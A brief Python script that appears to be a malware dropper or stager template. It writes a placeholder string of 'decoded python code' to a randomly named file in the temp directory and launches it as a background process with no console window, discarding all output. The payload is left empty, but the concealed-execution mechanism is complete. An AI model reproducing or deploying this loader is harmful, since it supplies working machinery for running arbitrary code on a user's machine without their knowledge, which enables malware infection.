import os
import subprocess
import sys
import tempfile
import uuid

def main():
    ds = "<decoded python code here>"
    if not ds:
        return

    sp = os.path.join(tempfile.gettempdir(), f"{str(uuid.uuid4())}.py")

    with open(sp, "w", encoding="utf-8") as sf:
        sf.write(ds)

    subprocess.Popen(
        [sys.executable, sp],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=subprocess.CREATE_NO_WINDOW
    )

if __name__ == "__main__":
    main()
